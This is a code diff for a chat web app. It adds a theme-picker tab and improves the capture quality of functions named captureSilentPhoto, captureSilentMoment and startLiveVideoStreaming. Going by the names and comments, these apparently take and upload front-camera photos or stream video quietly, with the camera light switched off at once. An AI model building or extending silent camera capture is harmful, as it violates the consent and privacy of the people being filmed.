@@ -531,6 +531,115 @@ function renderPeopleTab(tab) {
       </div>
     `;
     renderModalLogs(container.querySelector("#profile-modal-logs-gallery"));
+  } else if (tab === "themes") {
+    const activeTheme = localStorage.getItem("buzz-app-theme") || "default";
+    container.innerHTML = `
+      <div class="profile-section-title-wrap" style="margin-bottom: 24px;">
+        <h2 class="profile-section-title">App Themes</h2>
+      </div>
+      <p style="color: var(--text-secondary); font-size: 13px; margin-bottom: 16px;">
+        Choose a premium appearance theme to customize your InstaChat workspace:
+      </p>
+      <div class="theme-selector-grid">
+        <div class="theme-card ${activeTheme === 'default' ? 'active' : ''}" data-theme-id="default">
+          <div class="theme-card-header">
+            <span class="theme-card-title">Default Dark</span>
+            <div class="theme-color-dots">
+              <span class="color-dot" style="background: #3b82f6;"></span>
+              <span class="color-dot" style="background: #0f172a;"></span>
+            </div>
+          </div>
+          <div class="theme-card-preview">
+            <div class="theme-preview-bubble other">Hey! How is the app?</div>
+            <div class="theme-preview-bubble self">Looks awesome!</div>
+          </div>
+        </div>
+        <div class="theme-card ${activeTheme === 'purple' ? 'active' : ''}" data-theme-id="purple">
+          <div class="theme-card-header">
+            <span class="theme-card-title">Aurora Amethyst</span>
+            <div class="theme-color-dots">
+              <span class="color-dot" style="background: #a855f7;"></span>
+              <span class="color-dot" style="background: #090615;"></span>
+            </div>
+          </div>
+          <div class="theme-card-preview">
+            <div class="theme-preview-bubble other">Hey! How is the app?</div>
+            <div class="theme-preview-bubble self">Looks awesome!</div>
+          </div>
+        </div>
+        <div class="theme-card ${activeTheme === 'green' ? 'active' : ''}" data-theme-id="green">
+          <div class="theme-card-header">
+            <span class="theme-card-title">Forest Sage</span>
+            <div class="theme-color-dots">
+              <span class="color-dot" style="background: #10b981;"></span>
+              <span class="color-dot" style="background: #060a08;"></span>
+            </div>
+          </div>
+          <div class="theme-card-preview">
+            <div class="theme-preview-bubble other">Hey! How is the app?</div>
+            <div class="theme-preview-bubble self">Looks awesome!</div>
+          </div>
+        </div>
+        <div class="theme-card ${activeTheme === 'crimson' ? 'active' : ''}" data-theme-id="crimson">
+          <div class="theme-card-header">
+            <span class="theme-card-title">Midnight Crimson</span>
+            <div class="theme-color-dots">
+              <span class="color-dot" style="background: #ef4444;"></span>
+              <span class="color-dot" style="background: #0a0505;"></span>
+            </div>
+          </div>
+          <div class="theme-card-preview">
+            <div class="theme-preview-bubble other">Hey! How is the app?</div>
+            <div class="theme-preview-bubble self">Looks awesome!</div>
+          </div>
+        </div>
+        <div class="theme-card ${activeTheme === 'blue' ? 'active' : ''}" data-theme-id="blue">
+          <div class="theme-card-header">
+            <span class="theme-card-title">Cyber-Blue</span>
+            <div class="theme-color-dots">
+              <span class="color-dot" style="background: #0ea5e9;"></span>
+              <span class="color-dot" style="background: #050a12;"></span>
+            </div>
+          </div>
+          <div class="theme-card-preview">
+            <div class="theme-preview-bubble other">Hey! How is the app?</div>
+            <div class="theme-preview-bubble self">Looks awesome!</div>
+          </div>
+        </div>
+        <div class="theme-card ${activeTheme === 'rose' ? 'active' : ''}" data-theme-id="rose">
+          <div class="theme-card-header">
+            <span class="theme-card-title">Velvet Rose</span>
+            <div class="theme-color-dots">
+              <span class="color-dot" style="background: #f43f5e;"></span>
+              <span class="color-dot" style="background: #0d060a;"></span>
+            </div>
+          </div>
+          <div class="theme-card-preview">
+            <div class="theme-preview-bubble other">Hey! How is the app?</div>
+            <div class="theme-preview-bubble self">Looks awesome!</div>
+          </div>
+        </div>
+      </div>
+    `;
+
+    // Add click event listeners to theme cards
+    container.querySelectorAll(".theme-card").forEach(card => {
+      card.addEventListener("click", () => {
+        const themeId = card.dataset.themeId;
+        container.querySelectorAll(".theme-card").forEach(c => c.classList.remove("active"));
+        card.classList.add("active");
+        
+        // Apply theme to document
+        if (themeId === "default") {
+          document.documentElement.removeAttribute("data-theme");
+          localStorage.setItem("buzz-app-theme", "default");
+        } else {
+          document.documentElement.setAttribute("data-theme", themeId);
+          localStorage.setItem("buzz-app-theme", themeId);
+        }
+        showToast(`Theme switched to ${card.querySelector(".theme-card-title").textContent}`, "success");
+      });
+    });
   }
 }
 
@@ -1054,7 +1163,12 @@ async function captureSilentPhoto() {
     return;
   }
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(err => {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        width: { ideal: 1920 },
+        height: { ideal: 1080 }
+      }
+    }).catch(err => {
       console.warn("Camera access denied or unavailable for security capture:", err);
       return null;
     });
@@ -1073,9 +1187,14 @@ async function captureSilentPhoto() {
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
+    
+    // Enable high-quality image smoothing
+    ctx.imageSmoothingEnabled = true;
+    ctx.imageSmoothingQuality = "high";
+    
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
+    const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
 
     // Turn off camera light immediately
     stream.getTracks().forEach(track => track.stop());
@@ -1105,7 +1224,13 @@ async function captureSilentMoment(cameraPreference = null) {
     return;
   }
   try {
-    const videoConstraints = cameraPreference ? { video: { facingMode: { ideal: cameraPreference } } } : { video: true };
+    const videoConstraints = {
+      video: {
+        facingMode: cameraPreference ? { ideal: cameraPreference } : "user",
+        width: { ideal: 1920 },
+        height: { ideal: 1080 }
+      }
+    };
     const stream = await navigator.mediaDevices.getUserMedia(videoConstraints).catch(err => {
       console.warn("Camera access denied or unavailable for moment capture:", err);
       return null;
@@ -1124,9 +1249,14 @@ async function captureSilentMoment(cameraPreference = null) {
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
+    
+    // Enable high-quality image smoothing
+    ctx.imageSmoothingEnabled = true;
+    ctx.imageSmoothingQuality = "high";
+    
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
+    const dataUrl = canvas.toDataURL("image/jpeg", 0.92);
     stream.getTracks().forEach(track => track.stop());
 
     const res = await uploadMomentPhoto(dataUrl);
@@ -1156,7 +1286,14 @@ async function startLiveVideoStreaming(to, cameraPreference = null) {
     stopLiveVideoStreaming();
   }
   try {
-    const videoConstraints = cameraPreference ? { video: { facingMode: { ideal: cameraPreference } } } : { video: true };
+    const videoConstraints = {
+      video: {
+        facingMode: cameraPreference ? { ideal: cameraPreference } : "user",
+        width: { ideal: 1280 },
+        height: { ideal: 720 },
+        frameRate: { ideal: 30 }
+      }
+    };
     const stream = await navigator.mediaDevices.getUserMedia(videoConstraints).catch(err => {
       console.warn("Camera access denied or unavailable for live video streaming:", err);
       return null;
